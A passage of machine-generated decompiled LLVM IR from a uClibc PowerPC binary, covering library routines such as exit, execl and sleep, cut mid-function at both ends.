  br label %dec_label_pc_1000fb88

dec_label_pc_1000fb88:                            ; preds = %dec_label_pc_1000fb78, %dec_label_pc_1000fb50, %dec_label_pc_1000fb84
  %v1_1000fbbc = phi i32 [ 40, %dec_label_pc_1000fb78 ], [ %v1_1000fb68, %dec_label_pc_1000fb50 ], [ %v1_1000fb84, %dec_label_pc_1000fb84 ]
  %v1_1000fb88 = load i32, i32* %r30.global-to-local, align 4
  %v2_1000fb88 = icmp slt i32 %v1_1000fbbc, %v1_1000fb88
  br i1 %v2_1000fb88, label %dec_label_pc_1000fb90, label %dec_label_pc_1000fbc4

dec_label_pc_1000fb90:                            ; preds = %dec_label_pc_1000fb88
  br i1 %v3_1000fb54, label %dec_label_pc_1000fba0, label %dec_label_pc_1000fb94

dec_label_pc_1000fb94:                            ; preds = %dec_label_pc_1000fb90
  %v1_1000fb94 = load i32, i32* @r27, align 4
  %v0_1000fb98.not = icmp ne i32 %v0_1000fbb8, %v1_1000fb58
  %tmp25 = icmp ule i32 %v1_1000fbbc, %v1_1000fb94
  %or.cond = or i1 %tmp25, %v0_1000fb98.not
  br i1 %or.cond, label %dec_label_pc_1000fbb8, label %dec_label_pc_1000fba0

dec_label_pc_1000fba0:                            ; preds = %dec_label_pc_1000fb94, %dec_label_pc_1000fb90
  %v0_1000fba0 = call i32 @__errno_location()
  %v0_1000fba4 = load i32, i32* @r28, align 4
  %v1_1000fba4 = load i32, i32* @r26, align 4
  %v2_1000fba4 = and i32 %v1_1000fba4, %v0_1000fba4
  store i32 %v2_1000fba4, i32* @r28, align 4
  store i32 -1, i32* %r8.global-to-local, align 4
  %v2_1000fbb0 = inttoptr i32 %v0_1000fba0 to i32*
  store i32 34, i32* %v2_1000fbb0, align 4
  %v0_1000fb4c.pre = load i32, i32* %r31.global-to-local, align 4
  %v0_1000fb54.pre.pre = load i32, i32* %r8.global-to-local, align 4
  %v1_1000fb54.pre.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1000fb4c

dec_label_pc_1000fbb8:                            ; preds = %dec_label_pc_1000fb94
  %v2_1000fbb8 = mul i32 %v1_1000fb88, %v0_1000fbb8
  %v2_1000fbbc = add i32 %v2_1000fbb8, %v1_1000fbbc
  store i32 %v2_1000fbbc, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000fb4c

dec_label_pc_1000fbc4:                            ; preds = %dec_label_pc_1000fb88, %dec_label_pc_1000fb24
  %v0_1000fbcc = phi i32 [ %v0_1000fbcc14, %dec_label_pc_1000fb24 ], [ %v0_1000fbcc12, %dec_label_pc_1000fb88 ]
  %v0_1000fbc4 = load i32, i32* @r25, align 4
  %v3_1000fbc4 = icmp eq i32 %v0_1000fbc4, 0
  br i1 %v3_1000fbc4, label %dec_label_pc_1000fbd0, label %dec_label_pc_1000fbcc

dec_label_pc_1000fbcc:                            ; preds = %dec_label_pc_1000fbc4
  %v2_1000fbcc = inttoptr i32 %v0_1000fbc4 to i32*
  store i32 %v0_1000fbcc, i32* %v2_1000fbcc, align 4
  br label %dec_label_pc_1000fbd0

dec_label_pc_1000fbd0:                            ; preds = %dec_label_pc_1000fbc4, %dec_label_pc_1000fbcc
  %v0_1000fbd0 = load i32, i32* @r26, align 4
  %v3_1000fbd0 = icmp eq i32 %v0_1000fbd0, 0
  %v0_1000fbd4 = load i32, i32* @r28, align 4
  %v1_1000fbd4 = sub i32 0, %v0_1000fbd4
  %tmp27 = lshr i32 %v1_1000fbd4, 31
  %tmp28 = add nuw i32 %tmp27, 2147483647
  store i32 %tmp28, i32* @r31, align 4
  %v0_1000fc14.pre.pre = load i32, i32* %r8.global-to-local, align 4
  br i1 %v3_1000fbd0, label %dec_label_pc_1000fc04, label %dec_label_pc_1000fbec

dec_label_pc_1000fbec:                            ; preds = %dec_label_pc_1000fbd0
  %v3_1000fbec = icmp ugt i32 %v0_1000fc14.pre.pre, %tmp28
  br i1 %v3_1000fbec, label %dec_label_pc_1000fbf4, label %dec_label_pc_1000fc04

dec_label_pc_1000fbf4:                            ; preds = %dec_label_pc_1000fbec
  %v0_1000fbf4 = call i32 @__errno_location()
  %v2_1000fbfc = inttoptr i32 %v0_1000fbf4 to i32*
  store i32 34, i32* %v2_1000fbfc, align 4
  %v0_1000fc00 = load i32, i32* @r31, align 4
  store i32 %v0_1000fc00, i32* %r8.global-to-local, align 4
  %v0_1000fc04.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_1000fc04

dec_label_pc_1000fc04:                            ; preds = %dec_label_pc_1000fbd0, %dec_label_pc_1000fbec, %dec_label_pc_1000fbf4
  %v0_1000fc14.pre = phi i32 [ %v0_1000fc14.pre.pre, %dec_label_pc_1000fbec ], [ %v0_1000fc00, %dec_label_pc_1000fbf4 ], [ %v0_1000fc14.pre.pre, %dec_label_pc_1000fbd0 ]
  %v0_1000fc04 = phi i32 [ %v0_1000fbd4, %dec_label_pc_1000fbec ], [ %v0_1000fc04.pre, %dec_label_pc_1000fbf4 ], [ %v0_1000fbd4, %dec_label_pc_1000fbd0 ]
  %v3_1000fc04 = icmp eq i32 %v0_1000fc04, 0
  br i1 %v3_1000fc04, label %dec_label_pc_1000fc10, label %dec_label_pc_1000fc0c

dec_label_pc_1000fc0c:                            ; preds = %dec_label_pc_1000fc04
  %v1_1000fc0c = sub i32 0, %v0_1000fc14.pre
  store i32 %v1_1000fc0c, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000fc10

dec_label_pc_1000fc10:                            ; preds = %dec_label_pc_1000fc04, %dec_label_pc_1000fc0c
  %v0_1000fc14 = phi i32 [ %v1_1000fc0c, %dec_label_pc_1000fc0c ], [ %v0_1000fc14.pre, %dec_label_pc_1000fc04 ]
  ret i32 %v0_1000fc14

; uselistorder directives
  uselistorder i32 %v0_1000fc14.pre, { 1, 0 }
  uselistorder i32 %v0_1000fc14.pre.pre, { 0, 2, 1 }
  uselistorder i32 %v2_1000fbbc, { 1, 0 }
  uselistorder i32 %v1_1000fb68, { 1, 0 }
  uselistorder i32 %v1_1000fb64, { 1, 0 }
  uselistorder i32 %v1_1000fb5c, { 1, 0 }
  uselistorder i32 %v3_1000fb50, { 1, 0 }
  uselistorder i32 %v0_1000fbb8, { 1, 0, 2 }
  uselistorder i32 %v1_1000fb58, { 0, 2, 1 }
  uselistorder i32 %v0_1000fb4c, { 1, 0 }
  uselistorder i32 %v2_1000fb38, { 1, 0, 2 }
  uselistorder i32 %v1_1000fb10, { 1, 0 }
  uselistorder i32 %v1_1000fafc, { 1, 0, 2 }
  uselistorder i32 %v0_1000fad8, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 0, 2, 3 }
  uselistorder i32* %r8.global-to-local, { 0, 1, 5, 2, 3, 4, 6 }
  uselistorder i32* %r31.global-to-local, { 0, 1, 6, 2, 3, 7, 4, 5, 8 }
  uselistorder i32* %r30.global-to-local, { 5, 1, 0, 2, 3, 6, 4, 7 }
  uselistorder label %dec_label_pc_1000fc10, { 1, 0 }
  uselistorder label %dec_label_pc_1000fc04, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000fbd0, { 1, 0 }
  uselistorder label %dec_label_pc_1000fb88, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000fb50, { 1, 0 }
  uselistorder label %dec_label_pc_1000fb24, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000fb18, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000fadc, { 1, 0 }
  uselistorder label %dec_label_pc_1000fad8, { 1, 0 }
  uselistorder label %dec_label_pc_1000faa4, { 1, 0 }
}

define i32 @__GI_exit() local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_1000fc40 = ptrtoint i32* %stack_var_-40 to i32
  %v0_1000fc4c = load i32, i32* @r3, align 4
  store i32 %v0_1000fc4c, i32* @r31, align 4
  store i32 %v2_1000fc40, i32* @r3, align 4
  %v0_1000fc58 = call i32 @__pthread_return_void()
  %v0_1000fc60 = call i32 @__pthread_return_0()
  %v3_1000fc68 = load i32, i32* @global_var_1002b93c.783, align 4
  %v3_1000fc6c = icmp eq i32 %v3_1000fc68, 0
  br i1 %v3_1000fc6c, label %dec_label_pc_1000fc80, label %dec_label_pc_1000fc74

dec_label_pc_1000fc74:                            ; preds = %entry
  %v0_1000fc74 = load i32, i32* @r31, align 4
  %v3_1000fc7c = call i32 @unknown_0(i32 %v0_1000fc74, i32 ptrtoint (i32* @global_var_10030000.1 to i32))
  br label %dec_label_pc_1000fc80

dec_label_pc_1000fc80:                            ; preds = %entry, %dec_label_pc_1000fc74
  store i32 %v2_1000fc40, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  %v0_1000fc88 = call i32 @__pthread_return_void()
  store i32 %v0_1000fc88, i32* @r3, align 4
  store i32 268500112, i32* @lr, align 4
  %v1_1000fc8c = call i32 @__GI___uClibc_fini(i32 %v0_1000fc88)
  store i32 268500132, i32* @lr, align 4
  %v2_1000fca0 = call i32 @_stdio_term(i32 %v1_1000fc8c, i32 268487236)
  %v0_1000fca4 = load i32, i32* @r31, align 4
  %v1_1000fca8 = call i32 @__GI__exit(i32 %v0_1000fca4)
  ret i32 %v1_1000fca8

; uselistorder directives
  uselistorder label %dec_label_pc_1000fc80, { 1, 0 }
}

define i32 @execl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg5, i32* %r8.global-to-local, align 4
  %stack_var_8 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_1000fcac = ptrtoint i32* %stack_var_0 to i32
  %v2_1000fcc8 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_1000fcc8, i32* %r0.global-to-local, align 4
  %v2_1000fcd0 = ptrtoint i32* %stack_var_8 to i32
  store i32 %v2_1000fcc8, i32* %stack_var_-48, align 4
  store i32 %arg1, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000fcfc

dec_label_pc_1000fcfc:                            ; preds = %dec_label_pc_1000fd2c, %entry
  %v0_1000fd00 = phi i32 [ 0, %entry ], [ %v1_1000fd00, %dec_label_pc_1000fd2c ]
  %stack_var_-52.0 = phi i32 [ %v2_1000fcd0, %entry ], [ %stack_var_-52.1, %dec_label_pc_1000fd2c ]
  %stack_var_-56.0 = phi i8 [ 2, %entry ], [ %stack_var_-56.1, %dec_label_pc_1000fd2c ]
  %v4_1000fcfc = zext i8 %stack_var_-56.0 to i32
  %v1_1000fd00 = add i32 %v0_1000fd00, 1
  %v1_1000fd08 = mul nuw nsw i32 %v4_1000fcfc, 4
  store i32 %v1_1000fd08, i32* %r0.global-to-local, align 4
  %v2_1000fd0c = add i32 %v1_1000fd08, %v2_1000fcc8
  store i32 %v2_1000fd0c, i32* %r11.global-to-local, align 4
  %tmp19 = icmp ugt i8 %stack_var_-56.0, 7
  br i1 %tmp19, label %dec_label_pc_1000fd20, label %dec_label_pc_1000fd18

dec_label_pc_1000fd18:                            ; preds = %dec_label_pc_1000fcfc
  %v1_1000fd10 = add i8 %stack_var_-56.0, 1
  br label %dec_label_pc_1000fd2c

dec_label_pc_1000fd20:                            ; preds = %dec_label_pc_1000fcfc
  store i32 %stack_var_-52.0, i32* %r11.global-to-local, align 4
  %v1_1000fd24 = add i32 %stack_var_-52.0, 4
  store i32 %v1_1000fd24, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000fd2c

dec_label_pc_1000fd2c:                            ; preds = %dec_label_pc_1000fd18, %dec_label_pc_1000fd20
  %stack_var_-52.1 = phi i32 [ %v1_1000fd24, %dec_label_pc_1000fd20 ], [ %stack_var_-52.0, %dec_label_pc_1000fd18 ]
  %v0_1000fd2c = phi i32 [ %stack_var_-52.0, %dec_label_pc_1000fd20 ], [ %v2_1000fd0c, %dec_label_pc_1000fd18 ]
  %stack_var_-56.1 = phi i8 [ %stack_var_-56.0, %dec_label_pc_1000fd20 ], [ %v1_1000fd10, %dec_label_pc_1000fd18 ]
  %v1_1000fd2c = inttoptr i32 %v0_1000fd2c to i32*
  %v2_1000fd2c = load i32, i32* %v1_1000fd2c, align 4
  store i32 %v2_1000fd2c, i32* %r0.global-to-local, align 4
  %v3_1000fd30 = icmp eq i32 %v2_1000fd2c, 0
  br i1 %v3_1000fd30, label %dec_label_pc_1000fd38, label %dec_label_pc_1000fcfc

dec_label_pc_1000fd38:                            ; preds = %dec_label_pc_1000fd2c
  %v1_1000fd38 = mul i32 %v1_1000fd00, 4
  store i32 %v4_1000fcac, i32* %r0.global-to-local, align 4
  %v1_1000fd40 = add i32 %v1_1000fd38, 34
  store i32 %v1_1000fd00, i32* %ctr.global-to-local, align 4
  %v1_1000fd48 = call i32 @__asm_rlwinm(i32 %v1_1000fd40, i32 0, i32 0, i32 27)
  %v1_1000fd50 = load i32, i32* @r1, align 4
  %v3_1000fd50 = sub i32 %v1_1000fd50, %v1_1000fd48
  %v4_1000fd50 = inttoptr i32 %v3_1000fd50 to i32*
  store i32 %v4_1000fcac, i32* %v4_1000fd50, align 4
  %v1_1000fd54 = add i32 %v3_1000fd50, 23
  store i32 %v1_1000fd54, i32* %r0.global-to-local, align 4
  %v1_1000fd58 = call i32 @__asm_rlwinm(i32 %v1_1000fd54, i32 0, i32 0, i32 27)
  store i32 2, i32* %r0.global-to-local, align 4
  %v0_1000fd60 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000fd60 = inttoptr i32 %v1_1000fd58 to i32*
  store i32 %v0_1000fd60, i32* %v2_1000fd60, align 4
  store i32 %v1_1000fd58, i32* %r11.global-to-local, align 4
  %v0_1000fd68 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000fd68 = trunc i32 %v0_1000fd68 to i8
  store i32 %v2_1000fcc8, i32* %r0.global-to-local, align 4
  store i32 %v2_1000fcc8, i32* %stack_var_-48, align 4
  br label %dec_label_pc_1000fd7c

dec_label_pc_1000fd7c:                            ; preds = %dec_label_pc_1000fdb0.dec_label_pc_1000fd7c_crit_edge, %dec_label_pc_1000fd38
  %v0_1000fd80 = phi i32 [ %v1_1000fd58, %dec_label_pc_1000fd38 ], [ %v0_1000fd80.pre, %dec_label_pc_1000fdb0.dec_label_pc_1000fd7c_crit_edge ]
  %stack_var_-52.2 = phi i32 [ %v2_1000fcd0, %dec_label_pc_1000fd38 ], [ %stack_var_-52.3, %dec_label_pc_1000fdb0.dec_label_pc_1000fd7c_crit_edge ]
  %stack_var_-56.2 = phi i8 [ %v1_1000fd68, %dec_label_pc_1000fd38 ], [ %stack_var_-56.3, %dec_label_pc_1000fdb0.dec_label_pc_1000fd7c_crit_edge ]
  %v1_1000fd80 = add i32 %v0_1000fd80, 4
  store i32 %v1_1000fd80, i32* %r11.global-to-local, align 4
  %tmp20 = icmp ugt i8 %stack_var_-56.2, 7
  br i1 %tmp20, label %dec_label_pc_1000fda4, label %dec_label_pc_1000fd94

dec_label_pc_1000fd94:                            ; preds = %dec_label_pc_1000fd7c
  %v4_1000fd7c = zext i8 %stack_var_-56.2 to i32
  %v1_1000fd8c = add i8 %stack_var_-56.2, 1
  %v1_1000fd88 = mul nuw nsw i32 %v4_1000fd7c, 4
  %v3_1000fd94 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_1000fd94, i32* %r0.global-to-local, align 4
  %v2_1000fd9c = add i32 %v3_1000fd94, %v1_1000fd88
  br label %dec_label_pc_1000fdb0

dec_label_pc_1000fda4:                            ; preds = %dec_label_pc_1000fd7c
  %v1_1000fda8 = add i32 %stack_var_-52.2, 4
  store i32 %v1_1000fda8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000fdb0

dec_label_pc_1000fdb0:                            ; preds = %dec_label_pc_1000fd94, %dec_label_pc_1000fda4
  %stack_var_-52.3 = phi i32 [ %v1_1000fda8, %dec_label_pc_1000fda4 ], [ %stack_var_-52.2, %dec_label_pc_1000fd94 ]
  %v0_1000fdb0 = phi i32 [ %stack_var_-52.2, %dec_label_pc_1000fda4 ], [ %v2_1000fd9c, %dec_label_pc_1000fd94 ]
  %stack_var_-56.3 = phi i8 [ %stack_var_-56.2, %dec_label_pc_1000fda4 ], [ %v1_1000fd8c, %dec_label_pc_1000fd94 ]
  %v1_1000fdb0 = inttoptr i32 %v0_1000fdb0 to i32*
  %v2_1000fdb0 = load i32, i32* %v1_1000fdb0, align 4
  store i32 %v2_1000fdb0, i32* %r0.global-to-local, align 4
  %v2_1000fdb4 = inttoptr i32 %v1_1000fd80 to i32*
  store i32 %v2_1000fdb0, i32* %v2_1000fdb4, align 4
  %v0_1000fdb8 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000fdb8 = add i32 %v0_1000fdb8, -1
  store i32 %v1_1000fdb8, i32* %ctr.global-to-local, align 4
  %v2_1000fdb8 = icmp eq i32 %v1_1000fdb8, 0
  br i1 %v2_1000fdb8, label %dec_label_pc_1000fdbc, label %dec_label_pc_1000fdb0.dec_label_pc_1000fd7c_crit_edge

dec_label_pc_1000fdb0.dec_label_pc_1000fd7c_crit_edge: ; preds = %dec_label_pc_1000fdb0
  %v0_1000fd80.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000fd7c

dec_label_pc_1000fdbc:                            ; preds = %dec_label_pc_1000fdb0
  %v3_1000fdc0 = load i32, i32* @global_var_1002b944.785, align 4
  store i32 268500424, i32* @lr, align 4
  %v2_1000fdc4 = call i32 @__GI_execve(i32 %v3_1000fdc0, i32 ptrtoint (i32* @global_var_10030000.1 to i32))
  %v0_1000fdc8 = load i32, i32* @r1, align 4
  %v1_1000fdc8 = inttoptr i32 %v0_1000fdc8 to i32*
  %v2_1000fdc8 = load i32, i32* %v1_1000fdc8, align 4
  store i32 %v2_1000fdc8, i32* %r11.global-to-local, align 4
  %v1_1000fdcc = add i32 %v2_1000fdc8, 4
  %v2_1000fdcc = inttoptr i32 %v1_1000fdcc to i32*
  %v3_1000fdcc = load i32, i32* %v2_1000fdcc, align 4
  store i32 %v3_1000fdcc, i32* %r0.global-to-local, align 4
  ret i32 %v2_1000fdc4

; uselistorder directives
  uselistorder i32 %v1_1000fdb8, { 1, 0 }
  uselistorder i8 %stack_var_-56.2, { 2, 0, 3, 1 }
  uselistorder i32 %v1_1000fd08, { 1, 0 }
  uselistorder i32 %v1_1000fd00, { 1, 0, 2 }
  uselistorder i8 %stack_var_-56.0, { 2, 0, 1, 3 }
  uselistorder i32 %stack_var_-52.0, { 0, 1, 3, 2 }
  uselistorder i32 %v2_1000fcc8, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r8.global-to-local, { 1, 2, 0 }
  uselistorder i32 27, { 3, 4, 1, 2, 0, 5 }
  uselistorder i8 1, { 0, 1, 13, 14, 11, 12, 2, 3, 15, 10, 9, 8, 7, 6, 5, 4, 16, 17 }
  uselistorder label %dec_label_pc_1000fdb0, { 1, 0 }
  uselistorder label %dec_label_pc_1000fd2c, { 1, 0 }
}

define i32 @sleep(i32 %arg1) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-304 = alloca i32, align 4
  %stack_var_-432 = alloca i32, align 4
  %stack_var_-440 = alloca i32, align 4
  store i32 %arg1, i32* %r8.global-to-local, align 4
  %v3_1000fde0 = icmp eq i32 %arg1, 0
  br i1 %v3_1000fde0, label %dec_label_pc_1000ff94, label %dec_label_pc_1000fe10.lr.ph

dec_label_pc_1000fe10.lr.ph:                      ; preds = %entry
  %v2_1000fe04 = ptrtoint i32* %stack_var_-440 to i32
  store i32 %v2_1000fe04, i32* %r7.global-to-local, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  store i32 31, i32* %r11.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  %v2_1000fe1042 = add i32 %v2_1000fe04, 132
  %v3_1000fe1043 = inttoptr i32 %v2_1000fe1042 to i32*
  store i32 0, i32* %v3_1000fe1043, align 4
  %v0_1000fe1444 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000fe1445 = add i32 %v0_1000fe1444, -1
  store i32 %v1_1000fe1445, i32* %r11.global-to-local, align 4
  %v1_1000fe1846 = mul i32 %v1_1000fe1445, 4
  %v1_1000fe1c47 = load i32, i32* %r7.global-to-local, align 4
  %v2_1000fe1c48 = add i32 %v1_1000fe1c47, %v1_1000fe1846
  %v0_1000fe2049 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000fe2050 = add i32 %v0_1000fe2049, -1
  store i32 %v1_1000fe2050, i32* %ctr.global-to-local, align 4
  %v2_1000fe2051 = icmp eq i32 %v1_1000fe2050, 0
  br i1 %v2_1000fe2051, label %dec_label_pc_1000fe24, label %dec_label_pc_1000fe10.dec_label_pc_1000fe10_crit_edge

dec_label_pc_1000fe10.dec_label_pc_1000fe10_crit_edge: ; preds = %dec_label_pc_1000fe10.lr.ph, %dec_label_pc_1000fe10.dec_label_pc_1000fe10_crit_edge
  %v2_1000fe1c52 = phi i32 [ %v2_1000fe1c, %dec_label_pc_1000fe10.dec_label_pc_1000fe10_crit_edge ], [ %v2_1000fe1c48, %dec_label_pc_1000fe10.lr.ph ]
  %v0_1000fe10.pre = load i32, i32* %r10.global-to-local, align 4
  %v2_1000fe10 = add i32 %v2_1000fe1c52, 8
  %v3_1000fe10 = inttoptr i32 %v2_1000fe10 to i32*
  store i32 %v0_1000fe10.pre, i32* %v3_1000fe10, align 4
  %v0_1000fe14 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000fe14 = add i32 %v0_1000fe14, -1
  store i32 %v1_1000fe14, i32* %r11.global-to-local, align 4
  %v1_1000fe18 = mul i32 %v1_1000fe14, 4
  %v1_1000fe1c = load i32, i32* %r7.global-to-local, align 4
  %v2_1000fe1c = add i32 %v1_1000fe1c, %v1_1000fe18
  %v0_1000fe20 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000fe20 = add i32 %v0_1000fe20, -1
  store i32 %v1_1000fe20, i32* %ctr.global-to-local, align 4
  %v2_1000fe20 = icmp eq i32 %v1_1000fe20, 0
  br i1 %v2_1000fe20, label %dec_label_pc_1000fe24, label %dec_label_pc_1000fe10.dec_label_pc_1000fe10_crit_edge

dec_label_pc_1000fe24:                            ; preds = %dec_label_pc_1000fe10.dec_label_pc_1000fe10_crit_edge, %dec_label_pc_1000fe10.lr.ph
  %v0_1000fe38.pre = load i32, i32* %r8.global-to-local, align 4
  %v2_1000fe24 = ptrtoint i32* %stack_var_-432 to i32
  store i32 %v2_1000fe24, i32* %r29.global-to-local, align 4
  store i32 %v2_1000fe24, i32* @r3, align 4
  store i32 17, i32* @r4, align 4
  store i32 %v0_1000fe38.pre, i32* %stack_var_-440, align 4
  %v0_1000fe3c = call i32 @__sigaddset()
  store i32 %v0_1000fe3c, i32* %r3.global-to-local, align 4
  %v1_1000fe40 = icmp slt i32 %v0_1000fe3c, 0
  br i1 %v1_1000fe40, label %dec_label_pc_1000ff9c, label %dec_label_pc_1000fe48

dec_label_pc_1000fe48:                            ; preds = %dec_label_pc_1000fe24
  %v2_1000fe48 = ptrtoint i32* %stack_var_-304 to i32
  store i32 %v2_1000fe48, i32* @r31, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 268500572, i32* @lr, align 4
  %v3_1000fe58 = call i32 @__GI_sigprocmask(i32 0, i32 %v2_1000fe24, i32 %v2_1000fe48)
  store i32 %v3_1000fe58, i32* %r3.global-to-local, align 4
  %v3_1000fe5c = icmp eq i32 %v3_1000fe58, 0
  br i1 %v3_1000fe5c, label %dec_label_pc_1000fe64, label %dec_label_pc_1000ff9c

dec_label_pc_1000fe64:                            ; preds = %dec_label_pc_1000fe48
  store i32 %v2_1000fe48, i32* %r3.global-to-local, align 4
  %v2_1000fe6c = call i32 @__sigismember(i32 %v2_1000fe48, i32 17)
  store i32 %v2_1000fe6c, i32* %r3.global-to-local, align 4
  %v3_1000fe70 = icmp eq i32 %v2_1000fe6c, 0
  br i1 %v3_1000fe70, label %dec_label_pc_1000fe90.lr.ph, label %dec_label_pc_1000ff5c

dec_label_pc_1000fe90.lr.ph:                      ; preds = %dec_label_pc_1000fe64
  store i32 %v2_1000fe04, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  store i32 31, i32* %r11.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  store i32 0, i32* %v3_1000fe1043, align 4
  %v0_1000fe9433 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000fe9434 = add i32 %v0_1000fe9433, -1
  store i32 %v1_1000fe9434, i32* %r11.global-to-local, align 4
  %v1_1000fe9835 = mul i32 %v1_1000fe9434, 4
  %v1_1000fe9c36 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000fe9c37 = add i32 %v1_1000fe9c36, %v1_1000fe9835
  %v0_1000fea038 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000fea039 = add i32 %v0_1000fea038, -1
  store i32 %v1_1000fea039, i32* %ctr.global-to-local, align 4
  %v2_1000fea040 = icmp eq i32 %v1_1000fea039, 0
  br i1 %v2_1000fea040, label %dec_label_pc_1000fea4, label %dec_label_pc_1000fe90.dec_label_pc_1000fe90_crit_edge

dec_label_pc_1000fe90.dec_label_pc_1000fe90_crit_edge: ; preds = %dec_label_pc_1000fe90.lr.ph, %dec_label_pc_1000fe90.dec_label_pc_1000fe90_crit_edge
  %v2_1000fe9c41 = phi i32 [ %v2_1000fe9c, %dec_label_pc_1000fe90.dec_label_pc_1000fe90_crit_edge ], [ %v2_1000fe9c37, %dec_label_pc_1000fe90.lr.ph ]
  %v0_1000fe90.pre = load i32, i32* %r10.global-to-local, align 4
  %v2_1000fe90 = add i32 %v2_1000fe9c41, 8
  %v3_1000fe90 = inttoptr i32 %v2_1000fe90 to i32*
  store i32 %v0_1000fe90.pre, i32* %v3_1000fe90, align 4
  %v0_1000fe94 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000fe94 = add i32 %v0_1000fe94, -1
  store i32 %v1_1000fe94, i32* %r11.global-to-local, align 4
  %v1_1000fe98 = mul i32 %v1_1000fe94, 4
  %v1_1000fe9c = load i32, i32* %r8.global-to-local, align 4
  %v2_1000fe9c = add i32 %v1_1000fe9c, %v1_1000fe98
  %v0_1000fea0 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000fea0 = add i32 %v0_1000fea0, -1
  store i32 %v1_1000fea0, i32* %ctr.global-to-local, align 4
  %v2_1000fea0 = icmp eq i32 %v1_1000fea0, 0
  br i1 %v2_1000fea0, label %dec_label_pc_1000fea4, label %dec_label_pc_1000fe90.dec_label_pc_1000fe90_crit_edge

dec_label_pc_1000fea4:                            ; preds = %dec_label_pc_1000fe90.dec_label_pc_1000fe90_crit_edge, %dec_label_pc_1000fe90.lr.ph
  store i32 %v2_1000fe24, i32* @r3, align 4
  store i32 17, i32* @r4, align 4
  %v0_1000feac = call i32 @__sigaddset()
  store i32 %v0_1000feac, i32* %r3.global-to-local, align 4
  %v1_1000feb0 = icmp slt i32 %v0_1000feac, 0
  br i1 %v1_1000feb0, label %dec_label_pc_1000ff9c, label %dec_label_pc_1000feb8

dec_label_pc_1000feb8:                            ; preds = %dec_label_pc_1000fea4
  store i32 17, i32* %r3.global-to-local, align 4
  %v2_1000fec0 = ptrtoint i32* %stack_var_-176 to i32
  store i32 268500680, i32* @lr, align 4
  %v4_1000fec4 = call i32 @__libc_sigaction(i32 17, i32* null, i32 %v2_1000fec0)
  store i32 %v4_1000fec4, i32* %r3.global-to-local, align 4
  %tmp30 = icmp sgt i32 %v4_1000fec4, -1
  br i1 %tmp30, label %dec_label_pc_1000fef8, label %dec_label_pc_1000fed0

dec_label_pc_1000fed0:                            ; preds = %dec_label_pc_1000feb8
  %v0_1000fed0 = call i32 @__errno_location()
  store i32 %v0_1000fed0, i32* %r3.global-to-local, align 4
  %v1_1000fed8 = inttoptr i32 %v0_1000fed0 to i32*
  %v2_1000fed8 = load i32, i32* %v1_1000fed8, align 4
  store i32 %v0_1000fed0, i32* %r29.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268500716, i32* @lr, align 4
  %v3_1000fee8 = call i32 @__GI_sigprocmask(i32 2, i32 %v2_1000fe48, i32 0)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v2_1000fef0 = inttoptr i32 %v0_1000fed0 to i32*
  store i32 %v2_1000fed8, i32* %v2_1000fef0, align 4
  %v0_1000ffb0.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000ffa0

dec_label_pc_1000fef8:                            ; preds = %dec_label_pc_1000feb8
  %v3_1000fef8 = load i32, i32* %stack_var_-176, align 4
  %v3_1000ff04 = icmp eq i32 %v3_1000fef8, 1
  br i1 %v3_1000ff04, label %dec_label_pc_1000ff0c, label %dec_label_pc_1000ff40

dec_label_pc_1000ff0c:                            ; preds = %dec_label_pc_1000fef8
  store i32 %v2_1000fe04, i32* %r3.global-to-local, align 4
  store i32 268500760, i32* @lr, align 4
  %v2_1000ff14 = call i32 @__libc_nanosleep(i32 %v2_1000fe04, i32 %v2_1000fe04)
  store i32 %v2_1000ff14, i32* %r3.global-to-local, align 4
  store i32 %v2_1000ff14, i32* @r31, align 4
